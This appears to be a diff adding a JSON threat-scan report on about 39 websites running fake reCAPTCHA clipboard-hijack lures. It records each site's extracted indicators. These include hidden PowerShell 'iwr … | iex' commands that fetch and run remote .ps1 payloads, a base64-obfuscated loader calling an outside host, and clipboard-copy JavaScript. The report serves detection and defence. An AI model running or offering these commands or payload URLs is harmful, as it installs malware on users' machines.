@@ -1,0 +1,1093 @@
+{
+  "ReportTime": "2025-04-17 21:40:18",
+  "TotalSites": 39,
+  "Sites": [
+    {
+      "Url": "https://blessdayservices.org/up/",
+      "Timestamp": "2025-04-17 21:39:51",
+      "Base64Strings": null,
+      "Urls": [
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png",
+        "https://www.google.com/intl/en/policies/privacy/",
+        "https://www.google.com/intl/en/policies/terms/",
+        "https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1"
+      ],
+      "PowerShellCommands": [
+        "powershell -ArgumentList '-w hidden -c iwr https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 | iex' -WindowStyle Hidden\\\"\";",
+        "powershell \" + htaPath;"
+      ],
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification Hash",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...dy.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextAr..."
+      ],
+      "PowerShellDownloads": [
+        {
+          "FullMatch": "iwr https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 | iex",
+          "URL": "https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1",
+          "Context": "...n -c \\\"Start-Process powershell -ArgumentList '-w hidden -c iwr https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 | iex' -WindowStyle Hidden\\\"\"; const commandToRun = \"..."
+        },
+        {
+          "FullMatch": "| iex",
+          "URL": null,
+          "Context": "...https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 | iex' -WindowStyle Hidden\\\"\"; const commandToRun = \"..."
+        },
+        {
+          "FullMatch": "https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1",
+          "URL": "https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1",
+          "Context": "...\\\"Start-Process powershell -ArgumentList '-w hidden -c iwr https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 | iex' -WindowStyle Hidden\\\"\"; const commandToR..."
+        },
+        {
+          "FullMatch": "const htaPath = \"-w hidden -c \\\"",
+          "URL": "N/A (File Path)",
+          "HTAPath": "-w hidden -c \\",
+          "Context": "...d').textContent = verification_id; const htaPath = \"-w hidden -c \\\"Start-Process powershell -ArgumentList '-w hidden -c iwr htt..."
+        }
+      ]
+    },
+    {
+      "Url": "https://drmarlenemd.com/v/",
+      "Timestamp": "2025-04-17 21:39:53",
+      "Base64Strings": null,
+      "Urls": [
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png",
+        "https://www.google.com/intl/en/policies/privacy/",
+        "https://www.google.com/intl/en/policies/terms/",
+        "https://yogasitesdev.wpengine.com/2/15.ps1"
+      ],
+      "PowerShellCommands": "powershell \" + htaPath;",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification Hash",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...dy.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextAr..."
+      ],
+      "PowerShellDownloads": [
+        {
+          "FullMatch": "iwr 'https://yogasitesdev.wpengine.com/2/15.ps1' | iex",
+          "URL": "https://yogasitesdev.wpengine.com/2/15.ps1",
+          "Context": "...d; const htaPath = \"-w hidden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1' | iex\\\"\"; const commandToRun = \"powershell \" + htaPat..."
+        },
+        {
+          "FullMatch": "| iex",
+          "URL": null,
+          "Context": "...idden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1' | iex\\\"\"; const commandToRun = \"powershell \" + htaPat..."
+        },
+        {
+          "FullMatch": "'https://yogasitesdev.wpengine.com/2/15.ps1'",
+          "URL": "https://yogasitesdev.wpengine.com/2/15.ps1",
+          "Context": "...const htaPath = \"-w hidden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1' | iex\\\"\"; const commandToRun = \"powershell \" +..."
+        },
+        {
+          "FullMatch": "const htaPath = \"-w hidden -c \\\"",
+          "URL": "N/A (File Path)",
+          "HTAPath": "-w hidden -c \\",
+          "Context": "...d').textContent = verification_id; const htaPath = \"-w hidden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1' | iex\\\"\";..."
+        },
+        {
+          "FullMatch": "const htaPath = \"-w hidden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1'",
+          "URL": "N/A (File Path)",
+          "HTAPath": "-w hidden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1",
+          "Context": "...d').textContent = verification_id; const htaPath = \"-w hidden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1' | iex\\\"\"; const commandToRun = \"powershell \" +..."
+        }
+      ]
+    },
+    {
+      "Url": "https://jessespridecharters.com/v/",
+      "Timestamp": "2025-04-17 21:39:55",
+      "Base64Strings": null,
+      "Urls": [
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png",
+        "https://www.google.com/intl/en/policies/privacy/",
+        "https://www.google.com/intl/en/policies/terms/",
+        "https://yogasitesdev.wpengine.com/2/15.ps1"
+      ],
+      "PowerShellCommands": "powershell \" + htaPath;",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification Hash",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...dy.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextAr..."
+      ],
+      "PowerShellDownloads": [
+        {
+          "FullMatch": "iwr 'https://yogasitesdev.wpengine.com/2/15.ps1' | iex",
+          "URL": "https://yogasitesdev.wpengine.com/2/15.ps1",
+          "Context": "...d; const htaPath = \"-w hidden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1' | iex\\\"\"; const commandToRun = \"powershell \" + htaPat..."
+        },
+        {
+          "FullMatch": "| iex",
+          "URL": null,
+          "Context": "...idden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1' | iex\\\"\"; const commandToRun = \"powershell \" + htaPat..."
+        },
+        {
+          "FullMatch": "'https://yogasitesdev.wpengine.com/2/15.ps1'",
+          "URL": "https://yogasitesdev.wpengine.com/2/15.ps1",
+          "Context": "...const htaPath = \"-w hidden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1' | iex\\\"\"; const commandToRun = \"powershell \" +..."
+        },
+        {
+          "FullMatch": "const htaPath = \"-w hidden -c \\\"",
+          "URL": "N/A (File Path)",
+          "HTAPath": "-w hidden -c \\",
+          "Context": "...d').textContent = verification_id; const htaPath = \"-w hidden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1' | iex\\\"\";..."
+        },
+        {
+          "FullMatch": "const htaPath = \"-w hidden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1'",
+          "URL": "N/A (File Path)",
+          "HTAPath": "-w hidden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1",
+          "Context": "...d').textContent = verification_id; const htaPath = \"-w hidden -c \\\"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1' | iex\\\"\"; const commandToRun = \"powershell \" +..."
+        }
+      ]
+    },
+    {
+      "Url": "https://mail.lucprofessional.com.br/",
+      "Timestamp": "2025-04-17 21:39:56",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://mail.finocci.com/",
+      "Timestamp": "2025-04-17 21:39:57",
+      "Base64Strings": null,
+      "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
+      "Url": "https://kevinzhangadmin.jintsume.net/",
+      "Timestamp": "2025-04-17 21:39:57",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://cambodiatouristservice.com/",
+      "Timestamp": "2025-04-17 21:39:58",
+      "Base64Strings": null,
+      "Urls": [
+        "https://browser.certif-update.website/",
+        "https://browser.certif-update.website/"
+      ],
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
+      "Url": "https://admin.gestroom.it/",
+      "Timestamp": "2025-04-17 21:39:59",
+      "Base64Strings": null,
+      "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
+      "Url": "https://first-security-verden.de/",
+      "Timestamp": "2025-04-17 21:40:00",
+      "Base64Strings": null,
+      "Urls": [
+        "https://www.webgo.de/assets/images/misc/hazard-50x50.png",
+        "https://www.webgo.de/assets/images/misc/hazard-50x50.png",
+        "https://www.webgo.de/assets/images/logo.svg",
+        "https://www.webgo.de/assets/images/misc/construction.png",
+        "https://www.webgo.de/webhosting/"
+      ],
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
+      "Url": "https://lucprofessional.com.br/",
+      "Timestamp": "2025-04-17 21:40:00",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://www.first-security-verden.de/",
+      "Timestamp": "2025-04-17 21:40:01",
+      "Base64Strings": null,
+      "Urls": [
+        "https://www.webgo.de/assets/images/misc/hazard-50x50.png",
+        "https://www.webgo.de/assets/images/misc/hazard-50x50.png",
+        "https://www.webgo.de/assets/images/logo.svg",
+        "https://www.webgo.de/assets/images/misc/construction.png",
+        "https://www.webgo.de/webhosting/"
+      ],
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
+      "Url": "https://zamilgroups.com/",
+      "Timestamp": "2025-04-17 21:40:02",
+      "Base64Strings": null,
+      "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
+      "Url": "https://www.laborpartyjo.com/",
+      "Timestamp": "2025-04-17 21:40:03",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://finocci.com/",
+      "Timestamp": "2025-04-17 21:40:03",
+      "Base64Strings": null,
+      "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
+      "Url": "https://www.amun.jintsume.net/",
+      "Timestamp": "2025-04-17 21:40:03",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://www.finocci.com/",
+      "Timestamp": "2025-04-17 21:40:03",
+      "Base64Strings": null,
+      "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
+      "Url": "https://www.website.mypetapp.co.za/",
+      "Timestamp": "2025-04-17 21:40:05",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://www.lucprofessional.grupomoltz.com.br/",
+      "Timestamp": "2025-04-17 21:40:06",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://thesignaturemag.salviatech.com/",
+      "Timestamp": "2025-04-17 21:40:06",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://www.bratusferramentas.grupomoltz.com.br/",
+      "Timestamp": "2025-04-17 21:40:07",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://website.mypetapp.co.za/",
+      "Timestamp": "2025-04-17 21:40:08",
+      "Base64Strings": {
